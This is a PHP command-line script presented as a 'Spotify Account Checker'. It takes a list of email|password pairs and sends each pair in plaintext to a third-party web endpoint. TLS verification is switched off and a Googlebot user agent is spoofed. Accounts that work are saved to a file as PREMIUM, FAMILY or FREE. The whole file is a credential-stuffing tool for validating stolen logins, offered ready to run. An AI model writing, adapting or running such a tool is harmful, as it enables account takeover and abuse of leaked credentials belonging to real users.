<?php
/* Spotify Account Checker ./Mr.CH0P0Y
/* USAGE : php file.php list.txt */
error_reporting(0);
$m="\033[1;31m";
$k="\033[1;33m"; 
$h="\033[1;32m"; 
$b="\033[1;34m"; 
if($argv[1]){
	function cek($url){
		$ch = curl_init();
		curl_setopt($ch, CURLOPT_URL, $url);
		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
		curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
		curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)");
		$ex = curl_exec($ch);
		curl_close($ch);
		return($ex);
	}
	$list = explode("\r\n", file_get_contents($argv[1]));
	echo $b."====================================\n";
	$i = 1;
	foreach ($list as $uname) {
		$data1 = explode("|",$uname);
        $email = $data1[0];
        $pass = $data1[1];
		$cek = cek("https://www.ezcom-proaudio.my/sass/conn.php?email=$email&pass=$pass");
		if(preg_match("/FAMILY/i", $cek)){
			echo $b.$i++.") ".$k." ".$email."|".$pass." -> [PREMIUM FOR FAMILY]\n";
			$hasil = "".$email."|".$pass." -> [PREMIUM FOR FAMILY]\n";
			$file=fopen('spotify-live.txt',"a");
            fwrite($file,$hasil);
            fclose($file);
		}else if(preg_match("/GAGAL/", $cek)){
			echo $b.$i++.") ".$m." ".$email."|".$pass." -> Not Registered\n";
		}else if(preg_match("/PREMIUM/", $cek)){
			echo $b.$i++.") ".$k." ".$email."|".$pass." -> [PREMIUM]\n";
			$hasil = "".$email."|".$pass." -> [PREMIUM]\n";
			$file=fopen('spotify-live.txt',"a");
            fwrite($file,$hasil);
            fclose($file);
		}else if(preg_match("/FREE/", $cek)){
			echo $b.$i++.") ".$k." ".$email."|".$pass." -> [FREE]\n";
			$hasil = "".$email."|".$pass." -> [FREE]\n";
			$file=fopen('spotify-live.txt',"a");
            fwrite($file,$hasil);
            fclose($file);
		}else{
			echo $b.$i++.") ".$k." ".$email."|".$pass." -> [Menten dancok]\n";
		}
	}
	echo $b."====================================\n";
}else{
	echo "Usage : php ".$argv[0]." list.txt";
}
?>
